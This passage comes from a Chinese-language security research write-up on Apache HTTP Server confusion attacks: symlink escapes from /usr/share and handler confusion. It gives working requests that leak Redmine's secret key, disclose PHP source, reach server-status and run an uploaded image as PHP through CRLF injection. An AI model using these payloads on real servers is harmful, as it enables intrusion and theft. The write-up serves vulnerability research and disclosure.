+<h4 id="✔️-2-2-4-Local-Gadget-to-SSRF"><a href="#✔️-2-2-4-Local-Gadget-to-SSRF" class="headerlink" title="✔️ 2-2-4. Local Gadget to SSRF"></a>✔️ 2-2-4. Local Gadget to SSRF</h4><p>當然找到一個 SSRF 也不在話下，例如 MagpieRSS 提供了一個 <code>magpie_debug.php</code> 檔案就是一個絕佳的小工具：</p>
+<ul>
+<li>&#x2F;usr&#x2F;share&#x2F;php&#x2F;magpierss&#x2F;scripts&#x2F;magpie_debug.php</li>
+</ul>
+<h4 id="✔️-2-2-5-Local-Gadget-to-RCE"><a href="#✔️-2-2-5-Local-Gadget-to-RCE" class="headerlink" title="✔️ 2-2-5. Local Gadget to RCE"></a>✔️ 2-2-5. Local Gadget to RCE</h4><p>所以能 RCE 嗎？ 別急我們先慢慢來！ 首先這個攻擊手法已經可以把既有的攻擊面全部重新套用一次了，例如在某次開發過程中不小心被遺留下來 (甚至可能還是被第三方套件所依賴的) 的舊版本 PHPUnit，可以直接使用 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841">CVE-2017-9841</a> 來執行任意程式碼，又或者是安裝完 phpLiteAdmin (由於是唯讀副本所以預設密碼是 <code>admin</code>)，相信看到這邊會發現 Local Gadgets Manipulation 這個攻擊手法存在著無窮潛力，剩下只是發掘出更厲害以及更通用的小工具！</p>
+<h3 id="⚔️-Primitive-2-3-Jailbreak-from-Local-Gadgets"><a href="#⚔️-Primitive-2-3-Jailbreak-from-Local-Gadgets" class="headerlink" title="⚔️ Primitive 2-3. Jailbreak from Local Gadgets"></a>⚔️ Primitive 2-3. Jailbreak from Local Gadgets</h3><p>看到這裡你可能會好奇： 「真的不能跳出 <code>/usr/share</code> 嗎？」 當然可以，這也是要介紹的第三個攻擊手法 —— <strong>從 <code>/usr/share</code> 中越獄！</strong></p>
+<p><a target="_blank" rel="noopener" href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160">Debian&#x2F;Ubuntu</a> 的 Httpd 發行版中預設開啟了 <code>FollowSymLinks</code> 選項，就算非 Debian&#x2F;Ubuntu 發行版但 Apache HTTP Server 也隱含地預設<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/core.html#options">允許符號連結</a>。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory /&gt;</span></span><br><span class="line">    <span class="attribute">Options</span> FollowSymLinks</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> denied</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="✔️-2-3-1-Jailbreak-from-Local-Gadgets"><a href="#✔️-2-3-1-Jailbreak-from-Local-Gadgets" class="headerlink" title="✔️ 2-3-1. Jailbreak from Local Gadgets"></a>✔️ 2-3-1. Jailbreak from Local Gadgets</h4><p>因此只要有套件在它的安裝目錄下符號連結到 <code>/usr/share</code> 外，這個符號連結就成為一個跳板去存取更多的小工具完成更多的利用。 這裡列出一些我們已經發現可利用的符號連結：</p>
+<ul>
+<li><strong>Cacti Log</strong>: <code>/usr/share/cacti/site/</code> -&gt; <code>/var/log/cacti/</code></li>
+<li><strong>Solr Data</strong>: <code>/usr/share/solr/data/</code> -&gt; <code>/var/lib/solr/data</code></li>
+<li><strong>Solr Config</strong>: <code>/usr/share/solr/conf/</code> -&gt; <code>/etc/solr/conf/</code></li>
+<li><strong>MediaWiki Config</strong>: <code>/usr/share/mediawiki/config/</code> -&gt; <code>/var/lib/mediawiki/config/</code></li>
+<li><strong>SimpleSAMLphp Config</strong>: <code>/usr/share/simplesamlphp/config/</code> -&gt; <code>/etc/simplesamlphp/</code></li>
+</ul>
+<h4 id="✔️-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE"><a href="#✔️-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE" class="headerlink" title="✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE"></a>✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE</h4><p>越獄攻擊手法的最後讓我們展示一個利用 Redmine 的雙層符號連結跳躍去完成 RCE 的例子。 在預設安裝的 Redmine 程式碼目錄中有個 <code>instances/</code> 目錄指向 <code>/var/lib/redmine/</code>，而位於 <code>/var/lib/redmine/</code> 下的 <code>default/config/</code> 目錄又指向 <code>/etc/redmine/default/</code> 資料夾，裡面存放著 Redmine 的資料庫設定以及應用程式私密金鑰。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file /usr/share/redmine/instances/</span></span><br><span class="line"> symbolic link to /var/lib/redmine/</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file /var/lib/redmine/config/</span></span><br><span class="line"> symbolic link to /etc/redmine/default/</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/redmine/default/</span></span><br><span class="line"> database.yml    secret_key.txt</span><br></pre></td></tr></table></figure>
+<p>於是透過一個不安全的 <code>RewriteRule</code> 以及兩層符號連結，我們能夠輕鬆存取到 Redmine 所使用的應用程式金鑰：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</span></span><br><span class="line"> HTTP/1.1 200 OK</span><br><span class="line"> Server: Apache/2.4.59 (Ubuntu) </span><br><span class="line"> ...</span><br><span class="line"> 6d222c3c3a1881c865428edb79a74405</span><br></pre></td></tr></table></figure>
+<p>而 Redmine 又是基於 Ruby on Rails 所開發的應用程式，其中 <code>secret_key.txt</code> 的內容其實正是其簽章加密所使用到的金鑰，接下來的流程相信對<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view">熟悉攻擊 RoR 的同學</a>應該不陌生，透過已知的金鑰將惡意 Marshal 物件簽章加密後嵌入 Cookie，接著透過伺服器端的反序列化最終實現遠端程式碼執行！</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/9f927a5ccd4a2a69-08.png"></p>
+<h2 id="🔥-3-Handler-Confusion"><a href="#🔥-3-Handler-Confusion" class="headerlink" title="🔥 3. Handler Confusion"></a>🔥 3. Handler Confusion</h2><p>最後一個要介紹的攻擊是 Handler 上的 Confusion。 這個攻擊同樣也利用了一個 Apache HTTP Server 從上古時期架構所遺留下來的技術債。這裡透過一個例子來讓讀者快速的了解這個技術債 —— 如果今天想在 Httpd 上運行經典的 <code>mod_php</code>，下面兩個語法設定你覺得哪個才是正確的？</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddHandler</span> application/x-httpd-php .php</span><br><span class="line"><span class="attribute">AddType</span>    application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
+<p>答案是 —— 兩個都可以正確地讓 PHP 運行起來！ 這裡分別是兩個設定的語法格式，可以看到兩個設定不僅用法、參數類似，現在連效果都一模一樣，為什麼 Apache HTTP Server 當初要設計兩個不同的語法？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddHandler handler-name extension [extension] ...</span><br><span class="line">AddType media-type extension [extension] ...</span><br></pre></td></tr></table></figure>
+<p>實際上 <code>handler-name</code> 以及 <code>media-type</code> 在 Httpd 的內部結構中代表著不同的欄位，分別對應到 <code>r-&gt;handler</code> 以及 <code>r-&gt;content_type</code>。 而<strong>使用者可以在沒有感知的情況下使用則歸功於一段從 <a target="_blank" rel="noopener" href="https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c">1996 年</a> Apache HTTP Server 開發初期就遺留到現在的程式碼</strong>：</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420">server&#x2F;config.c#L420</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">AP_CORE_DECLARE(<span class="type">int</span>) ap_invoke_handler(request_rec *r) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!r-&gt;handler) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r-&gt;content_type) &#123;</span><br><span class="line">            handler = r-&gt;content_type;</span><br><span class="line">            <span class="keyword">if</span> ((p=ap_strchr_c(handler, <span class="string">&#x27;;&#x27;</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="type">char</span> *new_handler = (<span class="type">char</span> *)apr_pmemdup(r-&gt;pool, handler,</span><br><span class="line">                                                        p - handler + <span class="number">1</span>);</span><br><span class="line">                <span class="type">char</span> *p2 = new_handler + (p - handler);</span><br><span class="line">                handler = new_handler;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* exclude media type arguments */</span></span><br><span class="line">                <span class="keyword">while</span> (p2 &gt; handler &amp;&amp; p2[<span class="number">-1</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    --p2; <span class="comment">/* strip trailing spaces */</span></span><br><span class="line"></span><br><span class="line">                *p2=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            handler = AP_DEFAULT_HANDLER_NAME;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r-&gt;handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result = ap_run_handler(r);</span><br></pre></td></tr></table></figure>
+<p>可以看到在進入主要的模組處理器 <code>ap_run_handler()</code> 之前，如果請求中的 <code>r-&gt;handler</code> 為空則把結構中 <code>r-&gt;content_type</code> 欄位的內容當成最終將被使用的模組處理器。 這也就是為什麼 <code>AddType</code> 以及 <code>AddHandler</code> 效果一致的主要理由，因為 <code>media-type</code> 最終在執行前還是會被轉換成 <code>handler-name</code>。 我們的第三個 Handler Confusion 主要也就是圍繞在這個行為所發展出來的攻擊。</p>
+<h3 id="⚔️-Primitive-3-1-Overwrite-the-Handler"><a href="#⚔️-Primitive-3-1-Overwrite-the-Handler" class="headerlink" title="⚔️ Primitive 3-1. Overwrite the Handler"></a>⚔️ Primitive 3-1. Overwrite the Handler</h3><p>在理解這個轉換機制後首先第一個攻擊手法是 —— <strong>Overwrite the Handler</strong>，想像一下如果今天目標的 Apache HTTP Server 透過 <code>AddType</code> 將 PHP 運行起來。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php  .php</span><br></pre></td></tr></table></figure>
+<p>在正常的流程中瀏覽 <code>http://server/config.php</code>。 首先，<code>mod_mime</code> 會在 <code>type_checker</code> 階段根據 <code>AddType</code> 所設定的附檔名將相對應的內容複製到 <code>r-&gt;content_type</code> 中，由於 <code>r-&gt;handler</code> 在整個 HTTP 生命週期中並無賦值，於是在執行模組處理器前 <code>ap_invoke_handler()</code> 會將 <code>r-&gt;content_type</code> 當成模組處理器，最終呼叫 <code>mod_php</code> 處理請求。</p>
+<p>然而如果今天有任何模組在執行到 <code>ap_invoke_handler()</code> 前「不小心」把 <code>r-&gt;content_type</code> 覆寫掉了，那會發生什麼事呢？</p>
+<h4 id="✔️-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code"><a href="#✔️-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code" class="headerlink" title="✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code"></a>✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code</h4><p>因此這個攻擊手法的第一個利用就是透過這個「不小心」去洩漏任意 PHP 的原始碼。 這個技術最早是由 Max Dmitriev 在 ZeroNights 2021 所發表的研究中提及 (kudos to him!)，演講主題及投影片可以從這邊看到：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf">Apache 0day bug, which still nobody knows of, and which was fixed accidentally</a></p>
+</blockquote>
+<p>Max Dmitriev 觀察到只要送出錯誤的 <code>Content-Length</code>，遠端 Httpd 伺服器會發生不明的錯誤順帶回傳 PHP 的原始碼，在細追流程後發現其成因是 ModSecurity 在使用 APR (Apache Portable Runtime) 函示庫時並未好好的處理 <code>AP_FILTER_ERROR</code> 回傳值所導致的 <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a>。 由於發生錯誤時 Httpd 想送出一些 HTML 錯誤訊息，於是 <code>r-&gt;content_type</code> 也順便被覆寫成 <code>text/html</code>。</p>
+<p><img src="/posts/2024-08-confusion-attacks-ch/0bc450787c481aef-09.png"></p>
+<p>由於 ModSecurity 並未妥善的處理回傳值使得本該停止的 Httpd 內部流程繼續執行，而這個「副作用」又會把原本加上的 <code>Content-Type</code> 給覆寫掉，導致最終該被當成 PHP 的檔案被當成一般文件處理並將其中的程式碼及敏感設定印出。 🤫</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -v http://127.0.0.1/info.php -H <span class="string">&quot;Content-Length: x&quot;</span></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">HTTP/1.1 400 Bad Request</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Date: Mon, 29 Jul 2024 05:32:23 GMT</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Server: Apache/2.4.41 (Ubuntu)</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Content-Type: text/html; charset=iso-8859-1</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">...</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>理論上所有基於 <code>Content-Type</code> 的設定語法都容易遭受此類問題影響，所以除了 Max 在投影片中所展示的 <code>php-cgi</code> 搭配 <code>mod_actions</code> 外，純粹的 <code>mod_php</code> 搭配上 <code>AddType</code> 也同樣也受影響。</p>
+<p>另外值得一提的是，這個副作用在 Apache HTTP Server 版本 2.4.44 時被當成一個<a target="_blank" rel="noopener" href="https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a">增進請求解析器</a>的程式錯誤被更正，於是這個「漏洞」就被當成已修復直到我重新撿起它。 但由於其根本成因還是 ModSecurity 並未好好的處理錯誤，只要找到其它條觸發 <code>AP_FILTER_ERROR</code> 的路徑那同樣的行為還是可以重現成功。</p>
+<p><em>P.S. 此問題已於 6&#x2F;20 透過官方信箱回報給 ModSecurity 並由 Project Co-Leader 建議回到原 <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">GitHub Issue</a> 中討論。</em></p>
+<h4 id="✔️-3-1-2-Overwrite-Handler-to-██████-███████-██████"><a href="#✔️-3-1-2-Overwrite-Handler-to-██████-███████-██████" class="headerlink" title="✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████"></a>✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████</h4><p>基於前面提到的 <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a> 行為以及副作用，這個攻擊手法還可以完成其它更酷的利用，不過由於此問題尚未完全修復，更進一步的利用方式，將於修復完成後再揭露。</p>
+<h3 id="⚔️-Primitive-3-2-Invoke-Arbitrary-Handlers"><a href="#⚔️-Primitive-3-2-Invoke-Arbitrary-Handlers" class="headerlink" title="⚔️ Primitive 3-2. Invoke Arbitrary Handlers"></a>⚔️ Primitive 3-2. Invoke Arbitrary Handlers</h3><p>仔細思考前面 Overwrite Handler 攻擊手法，雖然是因為 ModSecurity 並未好好的處理錯誤，導致請求被設置上錯誤的 <code>Content-Type</code>。 但再深入的探究其根本原因應該是 —— <strong>Apache HTTP Server 在使用 <code>r-&gt;content_type</code> 時，其實無從辨別它的語意，這個欄位既可以是在請求階段被語法設定好的值，也可以是回應階段伺服器回傳 <code>Content-Type</code> 標頭的內容。</strong></p>
+<p>所以理論上如果能控制伺服器回應中 <code>Content-Type</code> 標頭的內容，那就可以透過那段從開發初期遺留至今的程式碼呼叫任意的模組處理器，這也是 Handler Confusion 的最後一個攻擊手法 —— <strong>呼叫任意 Apache HTTP Server 的內部模組處理器</strong>！</p>
+<p>但這裡還有最後的一塊拼圖必須填上，在 Httpd 中所有可以從伺服器回應修改到 <code>r-&gt;content_type</code> 的地方全都發生在那段遺留程式碼之後，就算修改到該欄位的內容，此時 HTTP 生命週期也進入尾聲，無法再做更進一步的利用…… 嗎？</p>
+<p>我們找了 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a> 來當救援投手！ RFC 3875 是一個關於 CGI 的規範，其中 <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2">6.2.2. 節</a>定義了一個 Local Redirect Response 行為:</p>
+<blockquote>
+<p>The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
+</blockquote>
+<p>簡單來說規範了 CGI 在特定條件下必須使用伺服器端的資源去處理轉址，仔細檢視 <code>mod_cgi</code> 對於這個規範的實作會發現：</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983">modules&#x2F;generators&#x2F;mod_cgi.c#L983</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret = ap_scan_script_header_err_brigade_ex(r, bb, sbuf,          <span class="comment">// &lt;------ [1]</span></span><br><span class="line">                                                APLOG_MODULE_INDEX)))</span><br><span class="line">&#123;</span><br><span class="line">    ret = log_script(r, conf, ret, dbuf, sbuf, bb, script_err);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == HTTP_NOT_MODIFIED) &#123;</span><br><span class="line">        r-&gt;status = ret;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = apr_table_get(r-&gt;headers_out, <span class="string">&quot;Location&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (location &amp;&amp; r-&gt;status == <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (location &amp;&amp; location[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; r-&gt;status == <span class="number">200</span>) &#123;          <span class="comment">// &lt;------ [2]</span></span><br><span class="line">    <span class="comment">/* This redirect needs to be a GET no matter what the original</span></span><br><span class="line"><span class="comment">     * method was.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    r-&gt;method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">    r-&gt;method_number = M_GET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We already read the message body (if any), so don&#x27;t allow</span></span><br><span class="line"><span class="comment">     * the redirected request to think it has one.  We can ignore</span></span><br><span class="line"><span class="comment">     * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    apr_table_unset(r-&gt;headers_in, <span class="string">&quot;Content-Length&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ap_internal_redirect_handler(location, r);                     <span class="comment">// &lt;------ [3]</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先 <code>mod_cgi</code> 會先執行<sup>[1]</sup> CGI 並掃描其輸出結果並設置上相對應的 <code>Status</code> 以及 <code>Content-Type</code>，如果<sup>[2]</sup>回傳的 <code>Status</code> 是 200 以及 <code>Location</code> 標頭欄位是 <code>/</code> 開頭則把這個回應當成一個伺服器端的轉址並開始處理<sup>[3]</sup>。 再仔細審視 <code>ap_internal_redirect_handler()</code> 的實作會發現：</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800">modules&#x2F;http&#x2F;http_request.c#L800</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">AP_DECLARE(<span class="type">void</span>) ap_internal_redirect_handler(<span class="type">const</span> <span class="type">char</span> *new_uri, request_rec *r)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> access_status;</span><br><span class="line">    request_rec *new = internal_internal_redirect(new_uri, r);    <span class="comment">// &lt;------ [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ap_die was already called, if an error occured */</span></span><br><span class="line">    <span class="keyword">if</span> (!new) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r-&gt;handler)</span><br><span class="line">        ap_set_content_type(new, r-&gt;content_type);                <span class="comment">// &lt;------ [2]</span></span><br><span class="line">    access_status = ap_process_request_internal(new);             <span class="comment">// &lt;------ [3]</span></span><br><span class="line">    <span class="keyword">if</span> (access_status == OK) &#123;</span><br><span class="line">        access_status = ap_invoke_handler(new);                   <span class="comment">// &lt;------ [4]</span></span><br><span class="line">    &#125;</span><br><span class="line">    ap_die(access_status, new);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Httpd 首先創建<sup>[1]</sup>了一個新的請求結構並將當前的 <code>r-&gt;content_type</code> 複<sup>[2]</sup>進去，在處<sup>[3]</sup>完生命週期後呼叫<sup>[4]</sup> <code>ap_invoke_handler()</code> —— 也就是前面提及包含歷史遺留轉換的地方，所以<strong>在伺服器端轉址中，如果可以控制回應標頭，就可以在 Httpd 中呼叫任意的模組處理器。</strong> 基本上所有 Apache HTTP Server 中的 CGI 系列實作都遵守這個行為，這裡是一個簡單的列表：</p>
+<ul>
+<li>mod_cgi</li>
+<li>mod_cgid</li>
+<li>mod_wsgi</li>
+<li>mod_uwsgi</li>
+<li>mod_fastcgi</li>
+<li>mod_perl</li>
+<li>mod_asis</li>
+<li>mod_fcgid</li>
+<li>mod_proxy_scgi</li>
+<li>…</li>
+</ul>
+<p>至於如何在真實情境中觸發這個伺服器轉址呢？ 由於至少需要控制 HTTP 回應中 <code>Content-Type</code> 及部分 <code>Location</code>，這裡給出兩個情境以供參考：</p>
+<ol>
+<li>位於 CGI 回應標頭中的 CRLF Injection，透過換行去覆寫已存在的 HTTP 標頭</li>
+<li>可完整控制回應標頭的 SSRF，例如託管在 <code>mod_wsgi</code> 上的 <a target="_blank" rel="noopener" href="https://django-revproxy.readthedocs.io/en/latest/">django-revproxy</a> 專案</li>
+</ol>
+<p>接下來的範例都基於這個不安全的 CRLF Injection 來做示範：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$q</span> = CGI-&gt;new;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$redir</span> = <span class="variable">$q</span>-&gt;param(<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$redir</span> =~ m&#123;^https?:<span class="regexp">//</span>&#125;) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Location: <span class="variable">$redir</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\n\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="✔️-3-2-1-Arbitrary-Handler-to-Information-Disclosure"><a href="#✔️-3-2-1-Arbitrary-Handler-to-Information-Disclosure" class="headerlink" title="✔️ 3-2-1. Arbitrary Handler to Information Disclosure"></a>✔️ 3-2-1. Arbitrary Handler to Information Disclosure</h4><p>首先是從任意模組處理器呼叫到資訊洩漏，這裡使用了 Httpd 內建的 <code>server-status</code> 模組處理器，這個模組處理器通常只被允許從本機存取：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Location /server-status&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> server-status</span><br><span class="line">    <span class="attribute">Require</span> local</span><br><span class="line"><span class="section">&lt;/Location&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在擁有任意模組處理器呼叫後，可以透過複寫 <code>Content-Type</code> 去存取原本存取不到的敏感資訊：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:server-status</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p><img src="/posts/2024-08-confusion-attacks-ch/dacded9bea644dff-10.png"></p>
+<h4 id="✔️-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts"><a href="#✔️-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts" class="headerlink" title="✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts"></a>✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts</h4><p>當然也能輕鬆的把一張圖片轉化成 PHP 後門，例如當使用者上傳了一個擁有合法副檔名的檔案後，可以透過這個攻擊手法指定特定模組 <code>mod_php</code> 去執行檔案內嵌的惡意程式碼，例如：</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;uploads&#x2F;avatar.webp</strong></em> %0d%0a<br><em><strong>Content-Type:application&#x2F;x-httpd-php</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
